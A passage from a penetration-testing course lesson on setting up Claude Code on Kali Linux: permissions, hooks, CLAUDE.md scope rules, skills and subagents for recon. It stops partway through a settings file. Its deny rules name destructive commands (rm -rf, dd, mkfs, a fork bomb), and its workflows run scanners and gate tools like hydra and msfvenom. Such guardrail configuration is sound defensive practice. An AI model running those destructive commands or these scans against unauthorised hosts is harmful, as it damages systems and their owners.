Lesson 01 — Claude Code Architecture and Capabilities

Claude Code and OpenAI Codex are not chatbots. They are extensible agent runtimes with hooks, skills, MCP servers, tool calling, and durable memory. Treated as chatbots they save minutes; treated as programmable engines they save days per engagement and eventually replace whole categories of manual scripting.

This module walks the entire authoring surface of Claude Code and Codex — skill anatomy, MCP server design, workflow orchestration, subagent patterns, hooks, settings — and builds three complete pentest skills together: a reconnaissance scanner, a vulnerability validator, and a report generator. Every artifact you produce here becomes a reusable component in every later engagement.

Claude Code agent loop with skills, MCP servers, hooks, and subagents — the machinery this module wires into your pentest workflow.

Claude Code agent loop with skills, MCP servers, hooks, and subagents — the machinery this module wires into your pentest workflow.

    Module 06: Building Pentest Skills with Claude and Codex · Penetration Testing with Kali Linux 2026 · Red Team Leaders

Introduction

Most people meet Claude through a browser chat window and never look past it. That is a mistake for a penetration tester. Claude Code is not a chat window — it is an agent runtime that lives on your Kali box, holds a shell, reads and writes files, follows explicit tool-use policies, and can be extended with your own scripts, playbooks, subagents, and network-attached servers. Understanding that runtime the way you understand nmap, burpsuite, or metasploit is what turns Claude from a novelty into a force multiplier during engagements.

This lesson is a ground-up tour of the runtime as it ships in 2026: the CLI, the built-in tools, the permission and settings system, conversation context and compaction, CLAUDE.md composition, MCP servers, hooks, slash commands, the Skills system, subagents, reasoning tiers, and how it compares to Codex CLI. By the end you will have a Kali install of Claude Code configured for offensive work — a settings.json, a hook that logs every command run during an engagement, a CLAUDE.md that keeps the model on-scope, a custom skill that codifies your recon workflow, and a slash command that produces a report skeleton. Every command in this lesson is one you should run in your lab.

The rest of Module 06 leans on this foundation. Lesson 02 teaches you to write your own MCP server for a bespoke recon tool. Lesson 03 walks through wiring Codex CLI alongside Claude Code. Lesson 04 builds a full engagement workflow that chains skills, hooks, and subagents. If you skim this lesson, later lessons will feel like magic — and magic is exactly what you cannot afford when a client is paying you to prove or disprove exploitability.
1. Claude Code Is an Agent Runtime, Not a Chat Window
1.1 What "agent runtime" means

A chat window takes a prompt and returns text. An agent runtime takes a prompt, runs a decision loop, and calls tools to change the world until the task is done. Claude Code's loop looks like this:
┌────────────────────────────────────────────────────────────┐
│  1. Read user prompt (or hook injection, or slash command) │
│  2. Load context: CLAUDE.md, skills, prior turns           │
│  3. Model produces text and/or tool calls                  │
│  4. Runtime executes tool calls (with permission gates)    │
│  5. Tool results fed back into the model                   │
│  6. Loop until model stops requesting tools                │
│  7. Emit final assistant message, run Stop hooks           │
└────────────────────────────────────────────────────────────┘

Every step is a place you can intercept: hooks at step 1, 4, 6, and 7; CLAUDE.md and skills at step 2; permission rules at step 4; MCP servers extend the tool set available at step 3.
1.2 Why a pentester should care

    Reproducibility. A properly configured runtime records every prompt, every tool call, and every file change. Your engagement notes write themselves.
    Guardrails. You can hard-deny destructive commands and require confirmation for anything that leaves the lab.
    Speed. A well-tuned skill runs a five-step recon workflow with one prompt.
    Scope enforcement. A hook can refuse to run nmap against anything outside scope.txt. That protects you and the client.
    Composability. The same runtime drives web pentests, Active Directory work, cloud audits, and report writing.

1.3 What is in scope for this lesson

We cover the runtime — installation, the REPL, tools, permissions, context, CLAUDE.md, MCP, hooks, slash commands, skills, subagents, reasoning modes, and a brief look at Codex CLI. We do not cover writing an MCP server (Lesson 02) or building a full engagement workflow (Lesson 04). Everything here is prerequisite plumbing.
2. Installing Claude Code on Kali 2026

Kali 2026 ships Node.js 22 LTS in its default repository, which is what Claude Code targets. Install it globally with npm.
2.1 Node.js prerequisite
# Confirm Node.js is present and at least version 20:
node --version
# v22.9.0

# If missing:
sudo apt update
sudo apt install -y nodejs npm

If you prefer a version manager, nvm or fnm both work. Do not use the snap package — the sandbox will interfere with Claude Code's ability to read your project files.
2.2 Install the CLI
# Install globally so the `claude` binary is on your PATH:
sudo npm install -g @anthropic-ai/claude-code

# Verify the install:
claude --version
# 2.4.1 (Claude Code)

# Show where the binary landed:
which claude
# /usr/bin/claude

If npm complains about permissions, either use sudo or configure a user-writable global prefix:
mkdir -p ~/.npm-global
npm config set prefix ~/.npm-global
echo 'export PATH=~/.npm-global/bin:$PATH' >> ~/.bashrc
source ~/.bashrc
npm install -g @anthropic-ai/claude-code
2.3 Authentication

You have two options: interactive login through the Anthropic console, or an API key in the environment. On Kali, the API key path is more reliable because you may be operating without a browser.
# Option A — interactive login (opens a browser tab):
claude login
# Follow the URL, approve the device, return to the terminal.

# Option B — API key in the environment:
export ANTHROPIC_API_KEY="sk-ant-api03-..."
echo 'export ANTHROPIC_API_KEY="sk-ant-api03-..."' >> ~/.bashrc

# Confirm auth is working:
claude --print "Say hello."
# Hello!

    Pentester Insight: Never bake a real API key into a lab VM you plan to share or snapshot. Use a scoped key you can rotate. Anthropic keys carry no per-tool permissions of their own — anyone with the key can spend from the account, so treat it like an SSH private key.

2.4 Directory layout after install
ls -la ~/.claude
# CLAUDE.md         # your global instructions
# settings.json     # your global settings
# commands/         # user slash commands
# skills/           # user skills
# agents/           # user subagent definitions
# projects/         # per-project state and transcripts
# logs/             # runtime logs (if enabled)

The ~/.claude directory is your workshop. Every serious Claude Code user shapes this directory over time; treat it like your ~/.zshrc or your ~/.gnupg.
3. Your First Interactive Session — The REPL

Change into an empty project directory and launch Claude Code with no arguments.
mkdir -p ~/engagements/lab-scratch
cd ~/engagements/lab-scratch
claude

You land in the REPL. Type prose to talk to the model; type / to invoke a slash command.
3.1 Core slash commands
Command	Purpose
/help	Lists every built-in command with a one-line description
/config	Opens the settings editor (theme, model, telemetry, permissions)
/model	Switches the active model tier (Opus, Sonnet, Haiku, etc.)
/clear	Wipes the conversation and starts fresh with the same context files
/compact	Summarizes the conversation so far to reclaim context
/status	Shows token counts, model, session id, and MCP connection state
/permissions	Interactive editor for allow/ask/deny rules
/mcp	Lists connected MCP servers and their tools
/agents	Lists available subagent types
/skills	Lists loaded skills and their trigger descriptions
/cost	Prints the running token-and-dollar cost for this session
/logout	Clears cached auth
/exit	Ends the session
3.2 What /clear versus /compact actually do

    /clear deletes conversation turns. The next turn behaves as if you just launched the session. CLAUDE.md, skills, and MCP servers reload; prior discussion is gone.
    /compact asks the model to summarize the conversation into a compact form and replaces the turns with that summary. Use /compact when a long research session has produced useful state you do not want to lose but you are running out of context. Use /clear between unrelated tasks.

3.3 Non-interactive mode

The REPL is not the only way in. --print (or -p) runs a single turn and exits, which is what you use inside shell scripts and CI:
# Ask a one-shot question:
claude --print "Summarize the last nmap scan in scans/target.xml"

# Pipe stdin into the prompt:
cat scans/target.xml | claude --print "Extract open ports as JSON"

# Force a specific model:
claude --print --model sonnet "Draft a brief exec summary"

# Continue the most recent session non-interactively:
claude --continue --print "Now list only the HTTP services."

--print writes only the final assistant message to stdout. Tool output and intermediate reasoning are not printed unless you pass --verbose.
3.4 Session state on disk

Every session lands in ~/.claude/projects/<hash>/. Each turn is a JSONL entry. This is the ground truth if you need to prove what was said or what the model executed during an engagement.
ls ~/.claude/projects/-home-kali-engagements-lab-scratch/
# 019abc.jsonl
# 019abd.jsonl

# Peek at the first message of the most recent session:
jq 'select(.type=="user") | .message.content' \
  ~/.claude/projects/-home-kali-engagements-lab-scratch/019abd.jsonl | head

Archive the JSONL files with your engagement evidence. They are the closest thing you have to a full audit log of the assistant's behavior.
4. The Built-in Tool System

The runtime ships with a fixed set of tools. Every tool call is a structured request the model emits and the runtime executes. You should know each one by name because you will grant, deny, and log them individually.
4.1 Built-in tool inventory
Tool	What it does	Typical use in a pentest
Bash	Executes a shell command	Running nmap, nikto, gobuster, custom scripts
Read	Reads a file (with line numbers, cat -n style)	Reviewing scan output, source code, config files
Write	Creates or overwrites a file	Producing report drafts, PoC scripts, wordlists
Edit	Exact-match string replacement in a file	Iterating on PoC exploits
Grep	Ripgrep-backed content search	Finding creds, tokens, endpoints in source dumps
Glob	Filename pattern matching	Locating config files across a large source tree
Task	Spawns a subagent (see Section 12)	Delegating recon fan-out or report drafting
WebFetch	Fetches a URL and asks the model a question about it	Reviewing CVE pages, vendor advisories, docs
TodoWrite	Maintains a structured task list visible in the UI	Tracking findings during a live engagement
NotebookEdit	Edits Jupyter notebooks	Cleaning up analysis notebooks
ExitPlanMode	Leaves plan-only mode	End of a planning session before execution

MCP-provided tools are named mcp__<server>__<toolname> and behave like built-ins from the model's point of view. Slash commands and hooks apply to them identically.
4.2 What each built-in requires

    Bash requires a command and an optional description. The runtime executes it in a persistent-cwd shell, but shell state (env vars, functions) does not persist between calls unless you set them in a startup file.
    Read requires an absolute file_path. Reading a huge file returns the first 2000 lines by default; pass offset and limit for the rest.
    Write requires an absolute file_path and full content. Overwriting a file you have not read is refused.
    Edit requires file_path, old_string, and new_string. The old_string must appear exactly once in the file, or you pass replace_all: true.
    Grep supports full ripgrep regex, output modes (content, files_with_matches, count), and file-type filters.
    Glob returns paths sorted by modification time. It is faster than find and understands ** recursion.
    Task requires a subagent_type and a prompt. It runs a fresh model instance with its own tool set and returns the final text.
    WebFetch requires a url and a prompt. It fetches, converts to markdown, and asks the model your question.
    TodoWrite takes a full list every call — no partial updates. Statuses are pending, in_progress, completed.

4.3 Tool call flow, illustrated
User prompt:  "Scan 10.10.10.5 for open ports and save results."
Model turn 1: Bash(command="nmap -sV 10.10.10.5 -oX scan.xml")
Runtime:      [permission check] -> [execute] -> [return exit code + output]
Model turn 2: Read(file_path="/home/kali/scan.xml")
Runtime:      [permission check] -> [return file content]
Model turn 3: (text) "Found ports 22, 80, 443 open. HTTP is nginx 1.24..."
Stop hook:    [runs, logs the transcript]

Nothing runs that the model did not request, and nothing the model requested runs without the permission gate saying yes.
5. The Permission Model

Every tool call passes through a three-verdict gate: allow, ask, or deny. Verdicts come from settings files, from hooks, or from the interactive prompt at the moment of the call.
5.1 Verdicts

    allow — run immediately, no prompt.
    ask — pause and ask the user; user answer applies to this call only unless the user chooses "always".
    deny — refuse. The model sees a rejection and typically adapts.

5.2 settings.json schema

Both ~/.claude/settings.json (global) and <project>/.claude/settings.json (project) share the same schema. Project overrides global on a per-key basis.
{
  "permissions": {
    "allow": [
      "Bash(nmap:*)",
      "Bash(gobuster:*)",
      "Bash(nikto:*)",
      "Read(//home/kali/engagements/**)",
      "Write(//home/kali/engagements/**)",
      "Edit(//home/kali/engagements/**)",
      "Grep(*)",
      "Glob(*)",
      "WebFetch(domain:nvd.nist.gov)",
      "WebFetch(domain:cve.mitre.org)",
      "WebFetch(domain:exploit-db.com)"
    ],
    "ask": [
      "Bash(sqlmap:*)",
      "Bash(hydra:*)",
      "Bash(msfconsole:*)",
      "Bash(metasploit:*)",
      "WebFetch(*)"
    ],
    "deny": [
      "Bash(rm -rf:*)",
      "Bash(dd:*)",
      "Bash(:(){:|:&};:)",
      "Bash(shutdown:*)",
      "Bash(reboot:*)",
      "Write(//etc/**)",
      "Write(//boot/**)",
      "Edit(//etc/**)"
    ]
  },
  "model": "sonnet",
  "env": {
    "ENGAGEMENT_ID": "ACME-2026-Q3"
  },
  "hooks": {},
  "outputStyle": "concise"
}
5.3 Rule syntax

    Bash(<pattern>) matches on the leading command. Bash(nmap:*) matches anything starting with nmap.
    Read(<glob>) uses double-slash-prefixed absolute paths so glob expansion in the shell does not eat them.
    WebFetch(domain:<host>) matches on the URL's host.
    Bare tool names match every call, e.g. Grep(*).

5.4 Precedence

Order of evaluation:

    Hook PreToolUse decisions (see Section 9).
    Project settings.local.json (git-ignored, per-user overrides).
    Project settings.json (committed to the repo, team-wide).
    Global ~/.claude/settings.json.
    Interactive prompt (in interactive mode) or hard-deny (in --print mode without --dangerously-skip-permissions).

More-specific rules win over less-specific ones within a file, and deny always beats allow.
5.5 A sane default for engagements

Start restrictive. It is easier to add an allow rule when you hit a prompt than to explain why the model just ran hydra against production.
# Edit the project settings quickly:
mkdir -p .claude
$EDITOR .claude/settings.json

# Or use the interactive editor from inside the REPL:
> /permissions
6. Conversation Context and Compaction

A model has a finite context window. In 2026 the default Sonnet tier ships with 1M input tokens and Opus with 500k, but even those are not infinite, and long engagements will use them up.
6.1 What counts toward the window

    Every user message and every assistant reply.
    Every tool call and every tool result.
    The system prompt.
    Every CLAUDE.md file loaded for this session.
    Every skill's SKILL.md frontmatter (not its body until triggered).
    Every MCP tool's schema.
    Cached images and file reads.

6.2 How to measure it
# Inside the REPL:
> /status
# Session: 019abd
# Model: claude-sonnet-4.7
# Tokens: 148,203 / 1,000,000 (14.8%)
# MCP: 3 connected, 47 tools

> /cost
# Input tokens:  148,203  ($0.44)
# Output tokens:  18,904  ($0.28)
# Total:                  ($0.72)
6.3 Compaction

When you approach the limit, the runtime will offer to compact. You can also trigger it any time with /compact. The compacted result replaces the transcript in place:
Original transcript (350k tokens)
   |
   v
Compacted summary (12k tokens) + original tool results kept for the last 5 turns

You lose fidelity but keep the plot. Anything critical (paths to files, discovered creds, IP addresses) should already be persisted to disk before compaction — the model can then re-Read them if needed.
6.4 PreCompact hook

The PreCompact hook runs before compaction so you can copy the full transcript somewhere durable (see Section 9).
7. CLAUDE.md Files

CLAUDE.md is how you inject standing instructions into every session. Three locations compose, from broadest to narrowest.
7.1 The three tiers
Path	Scope	When to use
~/.claude/CLAUDE.md	Every session on this machine	Personal preferences, name, standard tooling
<project>/CLAUDE.md	Every session started in this directory tree	Engagement scope, target list, house style
<project>/<subdir>/CLAUDE.md	Only when the cwd is at or below the subdir	Component-specific rules

They are concatenated in order and injected as part of the system prompt.
7.2 A pentest-focused global CLAUDE.md
# Kali pentest bench

- Operator: J. Santonio
- Toolbox lives in /opt/tools
- Engagements live in /home/kali/engagements/<client>-<year>-<quarter>/
- Always cite the file path when you reference scan output
- Never run destructive commands (rm -rf, dd, mkfs) without explicit approval
- Prefer XML/JSON scan outputs so downstream parsing is deterministic
- When editing PoC exploits, always include a short header comment naming the CVE
- If a target IP is not in ./scope.txt, refuse and ask the user
7.3 A per-engagement CLAUDE.md
# Acme Corp — Q3 2026 external pentest

## Scope
- 203.0.113.0/24 (Acme public prefix)
- *.acme.example (subdomains under the primary domain)
- OUT OF SCOPE: 203.0.113.42 (client's Salesforce), 203.0.113.99 (external MTA)

## Rules of engagement
- Testing window: 2026-09-05 08:00 to 2026-09-19 20:00 UTC
- No DoS, no social engineering, no physical
- Notify the client lead before running any exploit that changes server state

## House style
- Report drafts land in ./report/
- Findings numbered acme-<seq>, e.g. acme-014
- Every finding has severity, description, evidence, remediation
7.4 Composition rules

    Files are concatenated, not merged. If the global says "be terse" and the project says "be verbose", the last one wins.
    Symlinks are followed once. A loop is refused.
    Files larger than 128KB are truncated with a warning.
    Reload happens at every /clear, at session start, and whenever you edit the file mid-session and type /reload-claudemd.

7.5 The @import directive

Inside a CLAUDE.md you can pull other files in verbatim:
@import ./scope.txt
@import ~/team/red-team-house-style.md

Imports are resolved at load time. Cyclic imports are refused.
8. MCP Servers — the Extension Point

Model Context Protocol (MCP) is how you attach new tools to Claude Code without recompiling anything. An MCP server is a separate process that speaks the MCP wire protocol over stdio, SSE, or HTTP; Claude Code launches or connects to it at session start and merges its tools into the model's tool set.
8.1 Why you care as a pentester

You get a bespoke tool per workflow: a Burp Suite bridge, a Cobalt Strike beacon controller, a wordlist search server, a bloodhound query tool, an XML-scan-result summarizer. Each shows up to the model as if it were built-in.
8.2 Adding a server
# Add an MCP server that runs locally over stdio:
claude mcp add my-recon \
  --command /opt/tools/recon-mcp/target/release/recon-mcp \
  --scope user

# Add a server that speaks HTTP:
claude mcp add corp-kb \
  --url https://mcp.internal.example/kb \
  --transport http \
  --scope project

# Add with environment variables:
claude mcp add jira \
  --command node --args /opt/mcp-jira/dist/index.js \
  --env JIRA_API_TOKEN=xxxxx \
  --scope user
8.3 Listing and removing
# List every configured server, showing scope and connection state:
claude mcp list
# my-recon    (user)     connected    12 tools
# corp-kb     (project)  connected     4 tools
# jira        (user)     failed       0 tools    connection refused

# Remove one:
claude mcp remove jira --scope user
8.4 Scopes

    user (default): stored in ~/.claude/mcp.json. Available in every project.
    project: stored in <project>/.mcp.json. Committed to the repo so the team gets it too.
    local: stored in <project>/.claude/mcp.local.json. Per-machine, git-ignored.

8.5 Failure modes and diagnostics

If a server fails to start, the CLI reports the error at session start and disables its tools for the session. Common causes:

    ENOENT: the binary path is wrong or not executable.
    ConnectionRefused: the HTTP endpoint is down or the port is blocked.
    Transport mismatch: pointed the CLI at HTTP when the server speaks stdio.

Inside the REPL, /mcp shows current state and lets you retry the connection.
9. Hooks — Automating the Runtime

Hooks are shell commands the runtime executes at defined points in the loop. They let you enforce policy, log activity, and reshape behavior without touching the model.
9.1 The hook events
Event	Fires when	Can it block?
SessionStart	A new session starts	No
UserPromptSubmit	User has typed a prompt but before the model sees it	Yes (exit 2 blocks)
PreToolUse	Model has requested a tool call	Yes (exit 2 denies)
PostToolUse	A tool call has returned	No
Notification	Runtime wants to notify the user	No
Stop	Model is about to end its turn	Yes (exit 2 asks it to continue)
PreCompact	About to compact the transcript	No
SessionEnd	Session is closing	No
9.2 Hook contract

Each hook receives a JSON blob on stdin describing the event. Exit code 0 means "allow, no message". Exit code 2 means "block", and stderr is fed back to the model. Anything else is treated as a runtime error and logged.
9.3 Hook wiring

Hooks are declared in settings.json under a hooks object. Matchers can constrain by tool name or pattern.
{
  "hooks": {
    "SessionStart": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "date '+session start %F %T' >> ~/.claude/logs/audit.log"
          }
        ]
      }
    ],
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "/home/kali/.claude/hooks/scope-guard.sh"
          }
        ]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "jq -c . >> ~/.claude/logs/tool-calls.jsonl"
          }
        ]
      }
    ],
    "Stop": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "echo 'turn ended' >> ~/.claude/logs/audit.log"
          }
        ]
      }
    ]
  }
}
9.4 A scope guard

Refuse any nmap command that targets an IP not in scope.txt.
#!/usr/bin/env bash
# ~/.claude/hooks/scope-guard.sh
set -euo pipefail

payload="$(cat)"
tool="$(jq -r '.tool_name' <<< "$payload")"
cmd="$(jq -r '.tool_input.command // ""' <<< "$payload")"

if [[ "$tool" != "Bash" ]]; then exit 0; fi
if ! grep -qE '^(nmap|masscan|nikto|gobuster) ' <<< "$cmd"; then exit 0; fi

for target in $(grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' <<< "$cmd"); do
  if ! grep -qxF "$target" ./scope.txt 2>/dev/null; then
    echo "target $target is not in ./scope.txt — refusing" >&2
    exit 2
  fi
done
exit 0

Drop this in ~/.claude/hooks/scope-guard.sh, chmod +x it, and wire it up as PreToolUse on Bash above. The model now cannot scan out-of-scope hosts without the operator explicitly editing scope.txt.
9.5 A rate limiter

Prevent the model from firing scanners in a tight loop:
#!/usr/bin/env bash
# ~/.claude/hooks/rate-limit.sh
set -euo pipefail

state=~/.claude/state/last-scan
mkdir -p "$(dirname "$state")"
now=$(date +%s)
last=$(cat "$state" 2>/dev/null || echo 0)
if (( now - last < 15 )); then
  echo "rate limit: last scan was $((now-last))s ago, wait 15s" >&2
  exit 2
fi
echo "$now" > "$state"
exit 0
9.6 Audit logging

Every tool call and its result becomes a JSONL line. Combined with the session transcript in ~/.claude/projects/, this is a court-ready record of the assistant's behavior. Rotate the log with logrotate if you keep it long-term.
10. Slash Commands

Slash commands are user-defined shortcuts stored as Markdown files. When you type /foo, the runtime finds foo.md in either ~/.claude/commands/ or <project>/.claude/commands/ and treats its body as the prompt to send to the model. Arguments after the slash command are substituted at $ARGUMENTS.
10.1 A recon slash command
mkdir -p ~/.claude/commands
cat > ~/.claude/commands/recon.md <<'EOF'
---
description: Run a light recon pass against a target and summarize
argument-hint: <ip-or-domain>
---
Run the following, sequentially:

1. `nmap -sV -Pn --top-ports 200 -oX recon-nmap.xml $ARGUMENTS`
2. If HTTP or HTTPS is open, run `whatweb -a3 $ARGUMENTS`
3. If HTTPS is open, run `sslscan $ARGUMENTS`
4. Read the resulting files and produce a two-paragraph summary:
   - Paragraph 1: open ports, services, versions
   - Paragraph 2: initial attack surface hypothesis
Do NOT run anything intrusive.
EOF

Now /recon 10.10.10.5 triggers the workflow.
10.2 A report skeleton slash command
cat > ~/.claude/commands/finding.md <<'EOF'
---
description: Add a finding to the current engagement report
argument-hint: "<short-title>"
---
Append a new finding to ./report/findings.md with this template:

## Finding: $ARGUMENTS
- ID: (next in sequence)
- Severity: (Critical|High|Medium|Low|Info)
- Affected: (host, URL, endpoint)
- Description:
- Evidence: (log excerpt, screenshot path, request/response)
- Impact:
- Remediation:
- References:

Fill in what you can from context. Leave `TODO` for anything unknown.
EOF
10.3 Namespaced commands

Subdirectories become command namespaces. ~/.claude/commands/web/xss.md is invoked as /web:xss.
10.4 Flags

    description: (required in the frontmatter): shown by /help.
    argument-hint: (optional): shown in the input hint.
    allowed-tools: (optional): restrict the tools the model can use for this command.
    model: (optional): force a specific model tier for this command.

10.5 Slash commands versus skills

A slash command is invoked by the user. A skill is loaded by the runtime when trigger conditions match. Use commands for high-friction, high-value one-shots. Use skills for background knowledge that should shape the model whenever a task in that area comes up.
11. The Skills System

Skills are the runtime's playbook mechanism. Each skill lives in its own directory with a SKILL.md file whose frontmatter carries a name and a description. The description doubles as the trigger condition: at every turn the model considers whether it applies, and if it does, loads the body.
11.1 Directory layout
~/.claude/skills/
  web-recon/
    SKILL.md
    references/
      wordlists.md
      httpx-flags.md
    scripts/
      quick-httpx.sh
  ad-enum/
    SKILL.md
  report-writing/
    SKILL.md
11.2 SKILL.md frontmatter
---
name: web-recon
description: |
  Web application reconnaissance workflow for authorized bug bounty and
  penetration testing engagements. Use when the operator asks to enumerate
  a web target, list subdomains, discover endpoints, or fingerprint a
  webserver stack. Not for exploitation — for surface mapping only.
allowed-tools: Bash, Read, Write, Grep, Glob
---

# Web recon

## Preconditions
- `./scope.txt` exists and contains the in-scope hosts
- Working directory contains a `recon/` subdirectory (create it if missing)

## Workflow

1. Subdomain enumeration
   - `subfinder -d $TARGET -o recon/subs.txt`
   - `assetfinder --subs-only $TARGET | tee -a recon/subs.txt`
   - Dedupe: `sort -u -o recon/subs.txt recon/subs.txt`

2. Liveness
   - `httpx -l recon/subs.txt -status-code -title -tech-detect -o recon/http.txt`

3. Endpoint discovery on live hosts
   - `gau $TARGET | tee recon/urls.txt`
   - `waybackurls $TARGET | tee -a recon/urls.txt`

4. Directory brute
   - `ffuf -u https://<host>/FUZZ -w /usr/share/wordlists/dirb/common.txt -o recon/ffuf-<host>.json -of json`

5. Summarize
   - Produce `recon/summary.md` with:
     - Count of live subdomains
     - Interesting tech (WordPress, Jenkins, GitLab, etc.)
     - Directory-brute hits worth investigating

## References
See `references/httpx-flags.md` for the httpx flag cookbook and
`references/wordlists.md` for wordlist selection guidance.
11.3 Loading rules

    The name must be unique across all sources; conflicts are refused with a warning at load.
    The frontmatter (name + description) is always loaded and counted against the context.
    The body is loaded only when the model decides the skill applies — typically because the description matches the task at hand.
    References and scripts inside the skill's directory are read lazily by the model via Read.

11.4 Where skills come from

    Global: ~/.claude/skills/<name>/SKILL.md
    Project: <project>/.claude/skills/<name>/SKILL.md
    Plugin skills (installed via claude plugin): plugin-owned directories, listed with a plugin: prefix.

Project skills override global skills with the same name.
11.5 When to build a skill

Every time you find yourself typing the same five-line preamble to the model at the start of a task, that preamble should be a skill. Skills that pay off in a pentesting context:

    Per-tool cookbooks (nmap flag reference, ffuf recipes, sqlmap flags)
    Per-target-class playbooks (web, AD, cloud, mobile)
    Report writing house style
    CVE research (given a CVE, produce a triage note)
    Exploit development scaffolding (PoC template, Metasploit module skeleton)

11.6 Testing a skill
# From inside the REPL, list currently loaded skills:
> /skills

# Force-load one to review its content:
> /skill web-recon show

If a skill you wrote is not triggering, the description is the culprit 90% of the time. Rewrite it in the form "Use when …" and it usually lights up.
12. Subagents — Fan-Out and Specialization

The Task tool spawns a subagent. A subagent is a fresh Claude Code loop with its own conversation, its own tool set, and its own model tier. The parent turn continues once the subagent returns its final assistant message.
12.1 Why subagents

    Context isolation. A subagent's tool output does not fill the parent's window.
    Specialization. A subagent can be configured with a narrower tool set (read-only for a research task, full shell for a builder).
    Parallelism. Multiple subagents can run concurrently when the parent emits several Task calls in one turn.

12.2 Defining a subagent type

Subagent types are files in ~/.claude/agents/ or <project>/.claude/agents/.
---
name: recon-scout
description: |
  Read-only reconnaissance agent. Runs recon tools against in-scope hosts
  and returns a summary. Never edits files.
tools: Bash, Read, Grep, Glob
model: sonnet
---

# Recon scout

You are a recon-only agent. You do not write or edit files.
You return a terse summary of what you found, with file paths.

Now the parent can spawn it:
Task(subagent_type="recon-scout", prompt="Recon 10.10.10.5, 10.10.10.6, and 10.10.10.7 in parallel and summarize.")
12.3 Built-in agent types

    general-purpose: no restrictions.
    Explore: read-only broad search agent.
    Plan: architecture and planning, no writes.
    statusline-setup: configures the status line.
    Community and plugin-provided types show up alongside these.

12.4 Concurrency

When the parent turn issues multiple Task calls at once, they run in parallel. The runtime waits for all to return before advancing the parent turn. Use this to fan out per-target recon or per-host analysis.
12.5 Cost and quotas

Subagents burn tokens on their own account. A five-way fan-out at Sonnet can be cheap in wall-clock but expensive on tokens. Track it with /cost and cap it with a PreToolUse hook on Task if you need to.
13. Fast Mode and Reasoning Tiers

The runtime lets you pick a model per session, per command, or per subagent.
13.1 Model tiers in 2026
Tier	Latency	Reasoning depth	Typical cost	When to use
haiku	Sub-second	Light	Cheapest	Bulk file scanning, simple JSON transforms
sonnet	1–3s	Strong	Middle	Default for most engagement work
opus	3–8s	Deepest	Most expensive	Hard exploit development, ambiguous triage
fast (alias)	Fastest available	Whatever the fast alias currently points to	Cheapest	/fast mode: skip reasoning for quick edits
13.2 Switching mid-session
> /model sonnet
> /model opus
> /fast on
> /fast off

/fast on puts the runtime in a mode that suppresses extended reasoning tokens and prefers the smallest model that can still call tools. Turn it on when you know the task is mechanical (rename a variable across a file). Turn it off before hard work.
13.3 Model-per-command and model-per-agent

    Slash-command frontmatter can set model: opus.
    Agent-type frontmatter can set model: haiku.
    Environment variable ANTHROPIC_MODEL=sonnet sets the default for all sessions started from that shell.

13.4 Practical policy

    Default the session to Sonnet.
    Kick to Opus for exploit dev, cryptography analysis, and any triage that has a plausibility question.
    Route bulk log summarization and grep-glue subagents to Haiku.

14. Codex CLI — a Brief Comparison

OpenAI ships a competing agent runtime called Codex CLI (codex). It is broadly similar in shape but different in the details. A pentester should know both because the model behind each has different failure modes, and you will occasionally want a second opinion.
14.1 Feature parity
Capability	Claude Code	Codex CLI
Built-in Bash/Read/Write/Edit	Yes	Yes
Web search / fetch	Yes (WebFetch)	Yes
Permission model with allow/ask/deny	Yes	Simpler allow/deny
Hooks (7 events)	Yes	Session-start hook only
MCP client	Yes	Yes
MCP server (expose your own tools)	Via SDK	Via SDK
Slash commands	Markdown files	Markdown files
Skills	Yes	No native equivalent (workaround: SDK plus system prompt)
Subagents	Yes	Yes (--agent)
Non-interactive mode	claude --print	codex exec
Session transcripts	JSONL under ~/.claude/projects/	JSONL under ~/.codex/history/
14.2 When to reach for Codex

    The current Codex tier has particular strengths on a class of problem you are stuck on.
    You want a differently-biased second opinion on triage.
    A client's rules of engagement forbid a specific vendor.

14.3 When to stay in Claude Code

    You depend on hooks, skills, or MCP tools you have already built.
    You need the wider set of permission verbs.
    You want the Skills system, which is the largest single productivity multiplier this runtime offers.

We will run both side by side in Lesson 03.
15. Full Example — a Pentest-Ready Claude Code Install

Bring everything together. Start with an empty ~/.claude (or make a backup), then build the configuration piece by piece and verify each step.
15.1 Global CLAUDE.md
mkdir -p ~/.claude
cat > ~/.claude/CLAUDE.md <<'EOF'
# Kali pentest bench — global

- Operator: J. Santonio
- Engagements live under /home/kali/engagements/
- Wordlists live under /usr/share/wordlists/
- Always cite file paths when referencing scan output
- Never run rm -rf, dd, mkfs, shutdown, or reboot without explicit approval
- Prefer XML or JSON outputs from scanners for downstream parsing
- Do not run intrusive tests against a host not in ./scope.txt
EOF
15.2 Global settings.json
cat > ~/.claude/settings.json <<'EOF'
{
  "permissions": {
    "allow": [
      "Bash(nmap:*)",
      "Bash(gobuster:*)",
      "Bash(ffuf:*)",
      "Bash(nikto:*)",
      "Bash(whatweb:*)",
      "Bash(sslscan:*)",
      "Bash(httpx:*)",
      "Bash(subfinder:*)",
      "Bash(assetfinder:*)",
      "Bash(gau:*)",
      "Bash(waybackurls:*)",
      "Bash(jq:*)",
      "Bash(grep:*)",
      "Bash(sort:*)",
      "Bash(tee:*)",
      "Read(*)",
      "Grep(*)",
      "Glob(*)",
      "Write(//home/kali/engagements/**)",
      "Edit(//home/kali/engagements/**)",
      "WebFetch(domain:nvd.nist.gov)",
      "WebFetch(domain:cve.mitre.org)",
      "WebFetch(domain:exploit-db.com)"
    ],
    "ask": [
      "Bash(sqlmap:*)",
      "Bash(hydra:*)",
      "Bash(medusa:*)",
      "Bash(msfconsole:*)",
      "Bash(metasploit:*)",
      "Bash(msfvenom:*)",
      "WebFetch(*)"
    ],
    "deny": [
      "Bash(rm -rf:*)",
      "Bash(dd:*)",
      "Bash(mkfs:*)",
      "Bash(shutdown:*)",
      "Bash(reboot:*)",
      "Write(//etc/**)",
      "Write(//boot/**)",
      "Write(//root/**)",
      "Edit(//etc/**)"
    ]
  },
  "model": "sonnet",
  "hooks": {
    "SessionStart": [
      {
        "hooks": [
          { "type": "command", "command": "mkdir -p ~/.claude/logs && date '+session start %F %T' >> ~/.claude/logs/audit.log" }
        ]
      }
    ],
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          { "type": "command", "command": "/home/kali/.claude/hooks/scope-guard.sh" }
        ]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "*",
        "hooks": [
